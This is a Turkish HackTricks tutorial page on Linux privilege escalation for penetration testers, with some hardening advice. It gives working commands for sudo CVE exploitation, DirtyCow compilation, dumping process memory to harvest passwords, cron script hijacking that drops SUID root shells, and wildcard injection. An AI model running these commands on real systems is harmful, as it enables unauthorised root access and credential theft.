# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

Daha kapsamlı arka plan bilgisi ve geçmişte kullanılan enumeration iş akışları için references bölümünde listelenen g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation ve linux-private-i kaynaklarını karşılaştırın.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Sistem Bilgileri

### İşletim sistemi bilgileri

Çalışan işletim sistemi hakkında biraz bilgi edinmeye başlayalım.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Yol

`PATH` değişkenindeki herhangi bir klasör üzerinde **yazma izniniz** varsa bazı kütüphaneleri veya ikili dosyaları ele geçirebilirsiniz:

```bash
echo $PATH
```

### Ortam bilgileri

Ortam değişkenlerinde ilginç bilgiler, parolalar veya API key'ler var mı?

```bash
(env || set) 2>/dev/null
```

### Kernel exploitleri

Kernel sürümünü kontrol edin ve yetkileri yükseltmek için kullanılabilecek bir exploit olup olmadığını belirleyin.

[Kernel/LPE/CVE bölümü](../../main-system-information/kernel-lpe-cves/README.md), yerel yetki yükseltme örneklerini ve Binary Exploitation bölümündeki daha kapsamlı Linux kernel yazılarına bağlantıları bir araya getirir. Bir örnek olayı test etmeden önce etkilenen derlemeyi ve yapılandırmayı doğrulayın.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

İyi bir zafiyetli kernel listesi ve önceden **compiled exploits** dosyalarını burada bulabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
**compiled exploits** dosyalarını bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Web sitesindeki tüm zafiyetli kernel sürümlerini çıkarmak için şunu çalıştırabilirsiniz:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Araçlar, kernel exploit'lerini aramaya yardımcı olabilir:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (hedefte çalıştırın, yalnızca kernel 2.x için exploit'leri kontrol eder)

Kernel sürümünü her zaman **Google'da arayın**; kernel sürümünüz bir kernel exploit'inde yazıyor olabilir. Böylece bu exploit'in geçerli olduğundan emin olabilirsiniz.

Ek kernel exploitation teknikleri:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudo sürümü

Şurada yer alan savunmasız sudo sürümlerine dayanarak:

```bash
searchsploit sudo
```

Bu grep ile sudo sürümünün savunmasız olup olmadığını kontrol edebilirsiniz.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 ile 1.9.17 arasındaki sürümlerde**, sudo `/etc/nsswitch.conf` dosyasını kullanıcı denetimindeki bir dizinden yüklediğinde, ayrıcalıksız yerel kullanıcıların `--chroot` seçeneği üzerinden root yetkilerine yükselmesine olanak tanır; upstream bu sorunu **1.9.17p1** sürümünde düzeltti. İlgili yollardaki root-setuid bitine sahip tüm sudo binary'lerini kontrol edin; `sudo -V` yalnızca `PATH` tarafından seçilen binary'yi bildirir. Dağıtım paketleri, upstream sürüm dizesini değiştirmeden düzeltmeyi backport etmiş olabilir; bu nedenle satıcı paketinin durumunu da doğrulayın. [sudo maintainer'ın duyurusuna](https://www.openwall.com/lists/oss-security/2025/06/30/3) bakın.<sup>[[28]](#references)[[29]](#references)</sup>

İşte bu [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) için bir [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot). Exploit'i çalıştırmadan önce `sudo` sürümünüzün vulnerable olduğundan ve `chroot` özelliğini desteklediğinden emin olun.

Daha fazla bilgi için orijinal [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) sayfasına bakın.<sup>[[28]](#references)</sup>

### Sudo host-based kuralları atlatma (CVE-2025-32462)

Upstream sudo **1.8.8 ile 1.9.17 arasındaki sürümlerde**, host-based sudoers kurallarını, **gerçek hostname** yerine `sudo -h <host>` komutuyla **kullanıcının sağladığı hostname** değerini kullanarak değerlendirebilir; upstream bu sorunu **1.9.17p1** sürümünde düzeltti. Seçilen host için kullanıcının yine de eşleşen bir sudoers girdisi olmalıdır. Yerel ilkenin yanı sıra satıcı backport'larını ve alternatif sudo binary'lerini de inceleyin. [sudo maintainer'ın duyurusuna](https://www.openwall.com/lists/oss-security/2025/06/30/2) bakın.<sup>[[29]](#references)</sup>

Gereksinimler:
- Vulnerable sudo sürümü
- Host'a özgü sudoers kuralları (host, mevcut hostname veya `ALL` olmamalıdır)

Örnek sudoers kalıbı:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

İzin verilen host'u spoof ederek exploit et:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Seçilen adın çözümlenmesi engelleniyorsa, bu adın host üzerinde nasıl çözümlendiğini doğrulayın. Bir adı günlükte veya yapılandırma dosyasında görmek, çözümlenebilir olduğu anlamına gelmez; ayrıca `/etc/hosts` dosyasını değiştirmek genellikle ayrıcalıklı yazma erişimi gerektirir.

#### sudo < v1.8.28

Bu [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287), `(ALL, !root) /bin/bash` gibi, root kullanıcısını hariç tutarken `ALL` kullanıcıları adına komut çalıştırmaya izin veren etkin bir sudo kuralı gerektirir. Çağıranın, kimlik doğrulama gereksinimleri de dahil olmak üzere bu kuralı kullanma izni olmalıdır. Kurulu paketin güvenlik duyurusunu kontrol edin: sağlayıcılar düzeltmeyi, görüntülenen upstream sürümü hâlâ 1.8.28'in altında olan sürümlere geri taşıdı. Tek başına bir `!root` kuralı veya eski bir sürüm, sistemin etkilenebilir olduğunu doğrulamaz. Pasif keşif sırasında ayrıcalıklı bir komut test etmeyin.

```
sudo -u#-1 /bin/bash
```

### Dmesg imza doğrulaması başarısız oldu

Bu vuln'un nasıl exploit edilebileceğine dair bir **örnek** için **HTB'nin smasher2 makinesine** bakın.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Daha fazla sistem keşfi

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Olası savunmaları belirleyin

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Bir container içindeyseniz, aşağıdaki container-security bölümüyle başlayın ve ardından runtime’a özgü abuse sayfalarına geçin:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Sürücüler

**Nelerin mount ve unmount edildiğini**, nereye ve neden edildiğini kontrol edin. Unmount edilmiş bir şey varsa, mount etmeyi deneyip özel bilgileri kontrol edebilirsiniz.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Yararlı yazılımlar

Yararlı ikili dosyaları listeleyin

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Ayrıca, **herhangi bir derleyicinin kurulu olup olmadığını** kontrol edin. Bir kernel exploit kullanmanız gerekirse bu işe yarar; exploit’i kullanacağınız makinede (veya benzer bir makinede) derlemeniz önerilir.

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Yüklü Güvenlik Açığı Bulunan Yazılımlar

**Yüklü paketlerin ve hizmetlerin sürümlerini** kontrol edin. Örneğin, ayrıcalık yükseltmek için istismar edilebilecek eski bir Nagios sürümü olabilir…\
Daha şüpheli yüklü yazılımların sürümlerini elle kontrol etmeniz önerilir.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Makineye SSH erişiminiz varsa, makinede yüklü olan güncel olmayan ve savunmasız yazılımları kontrol etmek için **openVAS**'ı da kullanabilirsiniz.

> [!NOTE] > _Bu komutların çoğu işe yaramayacak çok fazla bilgi göstereceğini unutmayın; bu nedenle, yüklü yazılım sürümlerinden herhangi birinin bilinen exploit'lere karşı savunmasız olup olmadığını kontrol edecek OpenVAS veya benzeri uygulamaların kullanılması önerilir._

## İşlemler

Yürütülen **işlemlere** göz atın ve herhangi bir işlemin **olması gerekenden daha fazla ayrıcalığa** sahip olup olmadığını kontrol edin (örneğin, root tarafından yürütülen bir tomcat?).

```bash
ps aux
ps -ef
top -n 1
```

Her zaman çalışan [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) olup olmadığını kontrol edin; bunları ayrıcalıkları yükseltmek için kötüye kullanabilirsiniz. **Linpeas**, süreçlerin komut satırındaki `--inspect` parametresini kontrol ederek bunları tespit eder.\
Ayrıca **süreçlerin ikili dosyaları üzerindeki ayrıcalıklarınızı kontrol edin**; belki birinin dosyasının üzerine yazabilirsiniz.

### Kullanıcılar arası üst-alt süreç zincirleri

Üst sürecinden **farklı bir kullanıcı** altında çalışan bir alt süreç otomatik olarak kötü amaçlı değildir, ancak yararlı bir **triyaj sinyalidir**. Bazı geçişler beklenen durumlardır (`root` kullanıcısının bir servis kullanıcısı başlatması veya oturum yöneticilerinin oturum süreçleri oluşturması gibi); ancak alışılmadık zincirler wrapper'ları, debug yardımcılarını, persistence'ı veya zayıf runtime güven sınırlarını ortaya çıkarabilir.

Hızlı inceleme:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Şaşırtıcı bir zincir bulursanız üst süreç komut satırını ve davranışını etkileyen tüm dosyaları (`config`, `EnvironmentFile`, yardımcı betikler, çalışma dizini, yazılabilir argümanlar) inceleyin. Gerçek privesc yollarının birçoğunda alt süreç yazılabilir değildi; ancak **üst sürecin kontrolündeki config** veya yardımcı zincir yazılabilirdi.

### Silinmiş çalıştırılabilir dosyalar ve silinmiş-açık dosyalar

Runtime artifacts, **silindikten sonra bile** çoğu zaman erişilebilir durumdadır. Bu, hem privilege escalation hem de hassas dosyaları zaten açık tutan bir süreçten kanıt kurtarmak için kullanışlıdır.

Silinmiş çalıştırılabilir dosyaları kontrol edin:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

`/proc/<PID>/exe` `(deleted)` değerini gösteriyorsa, süreç eski ikili dosya görüntüsünü hâlâ bellekte çalıştırıyordur. Bu, araştırılması gereken güçlü bir işarettir çünkü:

- kaldırılan yürütülebilir dosya ilginç dizeler veya kimlik bilgileri içerebilir
- çalışan süreç hâlâ faydalı dosya tanımlayıcıları sunabilir
- silinmiş ayrıcalıklı bir ikili dosya, yakın zamanda yapılmış bir kurcalamaya veya izleri silme girişimine işaret edebilir

Silinmiş ve açık dosyaları sistem genelinde toplayın:

```bash
lsof +L1
```

İlginç bir tanımlayıcı bulursanız, onu doğrudan geri alın:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Bu, özellikle bir process silinmiş bir secret, script, veritabanı dışa aktarımı veya flag dosyasını hâlâ açık tuttuğunda çok değerlidir.

### Process izleme

Process'leri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanabilirsiniz. Bu, sık sık çalıştırılan veya belirli gereksinimler karşılandığında çalıştırılan savunmasız process'leri belirlemede çok faydalı olabilir.

#### sudo altında Linux ProcMon

[Linux için ProcMon](https://github.com/microsoft/ProcMon-for-Linux), seçili process'leri ve sistem çağrılarını izleyip SQLite trace'i kaydedebilir. `sudo -l` kısıtlanmamış, root yetkisiyle çalışabilen bir `procmon` komutuna izin veriyorsa, başka bir kullanıcının process'inin girdisini veya çıktısını gözlemleyip gözlemleyemeyeceğini değerlendirin. Bu izin yalnızca araştırılması gereken bir ipucudur: tracer desteği, etkin politika ve uygun bir process'in faaliyeti de önemlidir. Trace dosyaları secret içerebilir; bu nedenle yetkili dışa aktarımları dikkatle inceleyin ve ilgisiz process'leri toplamaktan kaçının.

### Process belleği

Bir sunucudaki bazı servisler **kimlik bilgilerini bellekte düz metin olarak saklar**.\
Normalde başka kullanıcılara ait process'lerin belleğini okumak için **root yetkilerine** ihtiyacınız olur. Bu nedenle, bu yöntem genellikle zaten root olduğunuzda daha fazla kimlik bilgisi bulmak için kullanışlıdır.\
Ancak **normal bir kullanıcı olarak sahibi olduğunuz process'lerin belleğini okuyabileceğinizi** unutmayın.

> [!WARNING]
> Günümüzde çoğu makinenin **ptrace kullanımına varsayılan olarak izin vermediğini** unutmayın. Bu, ayrıcalıksız kullanıcınıza ait diğer process'leri dökümleyemeyeceğiniz anlamına gelir.
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ dosyası ptrace erişilebilirliğini denetler:
>
> - **kernel.yama.ptrace_scope = 0**: Aynı uid'ye sahip oldukları sürece tüm process'ler hata ayıklama için izlenebilir. ptrace'in klasik çalışma şekli budur.
> - **kernel.yama.ptrace_scope = 1**: Yalnızca bir üst process hata ayıklama için izlenebilir.
> - **kernel.yama.ptrace_scope = 2**: CAP_SYS_PTRACE yetkisi gerektirdiğinden ptrace'i yalnızca admin kullanabilir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir process ptrace ile izlenemez. Bu ayar etkinleştirildikten sonra ptrace'i yeniden etkinleştirmek için yeniden başlatma gerekir.

Bir parola kasasının kilidini kısa süreliğine açan, aynı UID'ye sahip bir process ayrı bir kimlik bilgisi sınırı oluşturabilir. İzlemeye izin verildiğinde, etkin ve dumpable bir process; girdi sistem çağrıları veya belleği üzerinden kasa parolasını açığa çıkarabilir. Şifrelenmiş kasa dosyasının kendisi korunmaya devam etse bile bu mümkündür. `ptrace_scope=0` tek başına yeterli değildir: eşleşen kimlik bilgileri, hedefin dumpable durumu, diğer Linux güvenlik modülleri ve process'in çalışma süresi de önem taşır. Bir kasa girdisinin Unix root girişi olarak kullanılabilmesi için ayrıca kimlik bilgisi yeniden kullanımının kontrol edilmesi gerekir. Rutin keşif işlemleri, girdi yakalamak veya secret'ları yazdırmak yerine politikayı ve aday process ya da kasa yollarını raporlamalıdır. [Kernel'in Yama belgelerine](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) ve [ptrace erişim kontrollerine](https://man7.org/linux/man-pages/man2/ptrace.2.html) bakın.

#### GDB

Bir FTP servisinin belleğine erişiminiz varsa (örneğin), Heap'i alıp içindeki kimlik bilgilerini arayabilirsiniz.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB Script

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir süreç kimliği için **maps, belleğin bu sürecin sanal adres alanında nasıl eşlendiğini** gösterir; ayrıca **eşlenen her bölgenin izinlerini** de gösterir. **mem** sözde dosyası **sürecin belleğini doğrudan sunar**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve bunların ofsetlerini öğreniriz. Bu bilgileri kullanarak **mem dosyasında ilgili konumlara gider ve okunabilir tüm bölgeleri bir dosyaya dump ederiz**.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem`, sistemin **fiziksel** belleğine erişim sağlar; sanal belleğe değil. Kernel'ın sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle `/dev/mem` yalnızca **root** ve **kmem** grubundaki kullanıcılar tarafından okunabilir.

```
strings /dev/mem -n10 | grep -i PASS
```

### Linux için ProcDump

ProcDump, Windows için Sysinternals araç paketindeki klasik ProcDump aracının Linux için yeniden tasarlanmış sürümüdür. [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) adresinden edinebilirsiniz.

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Araçlar

Bir sürecin belleğini dökmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root gereksinimlerini manuel olarak kaldırabilir ve size ait sürecin dökümünü alabilirsiniz
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) içindeki A.5 numaralı betik (root gereklidir)

### Süreç Belleğinden Kimlik Bilgileri

#### Manuel örnek

Authenticator sürecinin çalıştığını fark ederseniz:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Process'i dump edebilir (bir process'in belleğini dump etmenin farklı yollarını görmek için önceki bölümlere bakın) ve bellekte kimlik bilgilerini arayabilirsiniz:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

[**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) ar bellekten ve bazı **bilinen dosyalardan** **açık metin kimlik bilgilerini çalar**. Düzgün çalışması için root ayrıcalıkları gerekir.

| Özellik                                           | İşlem Adı            |
| ------------------------------------------------- | -------------------- |
| GDM parolası (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Etkin FTP bağlantıları)                   | vsftpd               |
| Apache2 (Etkin HTTP Basic Auth oturumları)        | apache2              |
| OpenSSH (Etkin SSH oturumları - Sudo kullanımı)   | sshd:                |

#### Arama Regex'leri/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Zamanlanmış/Cron işleri

### Root olarak çalışan Crontab UI (alseambusher) – web tabanlı zamanlayıcı üzerinden privesc

Bir web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyor ve yalnızca loopback'e bağlıysa, SSH yerel port yönlendirmesiyle panele yine de erişebilir ve yetki yükseltmek için ayrıcalıklı bir job oluşturabilirsiniz.<sup>[[1]](#references)[[4]](#references)</sup>

Tipik zincir
- Loopback'e özel portu (ör. 127.0.0.1:8000) ve Basic-Auth realm'ini `ss -ntlp` / `curl -v localhost:8000` ile keşfedin
- Operasyonel dosyalarda kimlik bilgilerini bulun:
  - `zip -P <password>` kullanan yedekler/script'ler
  - `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` değerlerini açığa çıkaran systemd unit dosyası
- Tünel oluşturun ve oturum açın:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Yüksek ayrıcalıklı bir job oluştur ve hemen çalıştır (SUID shell bırakır):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Kullanın:
```bash
/tmp/rootshell -p   # root shell
```

Hardening
- Crontab UI'yi root olarak çalıştırmayın; özel bir kullanıcı ve minimum izinlerle sınırlandırın
- localhost'a bağlayın ve erişimi ayrıca firewall/VPN üzerinden kısıtlayın; parolaları tekrar kullanmayın
- Gizli bilgileri unit dosyalarına gömmekten kaçının; secret store veya yalnızca root'un erişebildiği EnvironmentFile kullanın
- İsteğe bağlı görev çalıştırmaları için audit/logging'i etkinleştirin

Zamanlanmış görevlerden herhangi birinin savunmasız olup olmadığını kontrol edin. Belki root tarafından çalıştırılan bir script'ten yararlanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? symlink kullanabilir misiniz? root'un kullandığı dizinde belirli dosyalar oluşturabilir misiniz?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

`run-parts` kullanılıyorsa, hangi adların gerçekten çalıştırılacağını kontrol edin:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Bu, yanlış pozitifleri önler. Yazılabilir bir periyodik dizin yalnızca payload dosya adınız yerel `run-parts` kurallarıyla eşleşiyorsa işe yarar.

### Cron path

Örneğin, _/etc/crontab_ içinde PATH'i bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_"user" kullanıcısının /home/user üzerinde yazma izinlerine sahip olduğuna dikkat edin_)

Bu crontab içinde root kullanıcısı path ayarlamadan bir komut veya script çalıştırmaya çalışırsa. Örneğin: _\* \* \* \* root overwrite.sh_\
Ardından, şunu kullanarak bir root shell elde edebilirsiniz:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Wildcard kullanan bir script üzerinden Cron (Wildcard Injection)

Root tarafından çalıştırılan bir script, bir komutun içinde “**\***” barındırıyorsa, bunu beklenmedik şeyler (ör. privesc) yapmak için exploit edebilirsiniz. Örnek:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Wildcard'dan önce** _**/some/path/\***_ **gibi bir yol varsa, güvenlik açığına sahip değildir (hatta** _**./\***_ **bile).**

Wildcard exploitation için daha fazla püf noktası için aşağıdaki sayfayı okuyun:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Cron log ayrıştırıcılarında Bash aritmetik genişletme enjeksiyonu

Bash aritmetiği, güvenilmeyen metni ifade olarak yorumlayabilir. Etkilenen Bash bağlamlarında, bu ifadenin içindeki bir dizi alt indisi komut ikamesini değerlendirebilir. Ayrıcalıklı bir cron/ayrıştırıcı, saldırganın kontrolündeki log metnini böyle bir aritmetik karşılaştırmaya yerleştirirse, komut ikamesi ayrıştırıcının kimliğiyle çalışabilir.<sup>[[22]](#references)</sup> Bu, kullanılan Bash ifadesine ve sürümüne bağlıdır; genişletilmiş bir değişkende tek başına bulunan yalın bir `$(...)0` dizgesi, yeniden değerlendirme için güvenilir bir gösterim değildir.

Girdi, dosya meta verilerinden veya kullanıcı tarafından yazılabilir bir konumdan okunan başka bir alandan da gelebilir. Örneğin, `Producer` etiketini okuyan ve bunu `[[ "$producer" -eq "expected" ]]` ile karşılaştıran ayrıcalıklı bir temizleme betiği, değişken tırnak içine alınmış olsa bile aritmetik karşılaştırma yapar. Zamanlanmış işlemin hangi kimlikle çalıştığını, etiketi hangi dosyaların sağlayabildiğini, karşılaştırmadan önce hangi dönüşümlerin uygulandığını ve Bash'in tam davranışını inceleyin. Metin etiketleri için dizge karşılaştırması kullanın; sayılar için aritmetik işlemden önce girdinin yalnızca ondalık rakamlardan oluştuğunu doğrulayın. [Bash arithmetic rules](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html) bölümüne bakın.

- Tipik güvenlik açığı bulunan kalıp:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Dizi alt simge mekanizması için güvenli yerel davranış sondası (ayrıcalıklı işlem veya dosya değişikliği yok):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Gerçek zamanlanmış scripti ve açtığı literal girdi yolunu izleyin. Log dosyasının kendisi yazılabilir olmasa bile, dosyanın sticky bit ayarlanmamış üst dizinine yazma ve dizinde gezinme izni olan bir kullanıcı, dizin girdisini değiştirebilir; bu izinleri ayırt etmek için `namei -l` yardımcı olur. Farklı bir yazılabilir log yolu, okunamayan bir zamanlayıcı veya bu alanı Bash aritmetiği olarak değerlendirmeyen bir ayrıştırıcı, bu yolun kullanılabildiğini göstermez.

### Cron scriptinin üzerine yazma ve symlink

Root tarafından çalıştırılan bir cron scriptini **değiştirebiliyorsanız**, kolayca bir shell elde edebilirsiniz:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Root tarafından çalıştırılan script, **tam erişiminizin olduğu bir dizini** kullanıyorsa, o klasörü silip **başka bir yere işaret eden bir symlink klasör oluşturmak** ve sizin kontrol ettiğiniz bir script'i çalıştırmasını sağlamak işe yarayabilir.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Symlink doğrulaması ve daha güvenli dosya işleme

Dosyaları yol üzerinden okuyan veya yazan ayrıcalıklı script’leri/binary’leri incelerken, bağlantıların nasıl ele alındığını doğrulayın:

- `stat()` bir symlink’i izler ve hedefin metadata’sını döndürür.
- `lstat()` bağlantının kendisinin metadata’sını döndürür.
- `readlink -f` ve `namei -l`, nihai hedefi çözümlemeye ve her yol bileşeninin izinlerini görüntülemeye yardımcı olur.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Savunmacılar/geliştiriciler için symlink hilelerine karşı daha güvenli yaklaşımlar şunlardır:

- `O_EXCL` ile `O_CREAT`: yol zaten varsa işlemi başarısız kılar (saldırganın önceden oluşturduğu linkleri/dosyaları engeller).
- `openat()`: güvenilir bir dizin dosya tanıtıcısına göre işlem yapar.
